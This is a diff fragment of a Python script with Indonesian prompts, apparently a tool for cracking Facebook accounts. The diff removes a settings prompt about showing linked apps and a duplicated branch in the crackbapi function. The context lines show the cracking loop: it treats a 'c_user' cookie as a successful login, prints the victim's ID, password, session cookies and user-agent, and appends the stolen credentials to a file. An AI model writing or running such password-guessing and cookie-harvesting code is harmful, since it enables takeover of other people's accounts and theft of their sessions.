@@ -1591,15 +1591,6 @@ def setting():
 	else:
 		pwpluss.append('no')
 	
-	_brayen_ = input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;96mApakah Anda Ingin Menampilkan Aplikasi Yang Terkait Y/T : \x1b[1;97m')
-	if _brayen_ in ['']:
-		print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;91mPilih Yang Bener uy ')
-		back()
-	elif _brayen_ in ['y','Y']:
-		taplikasi.append('ya')
-	else:
-		taplikasi.append('no')
-		
 	uatambah = input(f' {P}[{H}+{P}] \33[1;96mApakah Anda Ingin Mengunakan User-Agent Manual Di Script Y/T :{P} ')
 	if uatambah in ['y','Ya','ya','Y']:
 		ualuh.append('ya')
@@ -1776,15 +1767,6 @@ def crackbapi(idf,pwv):
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				ok+=1
-				coki=po.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(panel(f"[bold green]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
-				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
-				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
-				break
-			elif 'ya' in taplikasi:
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
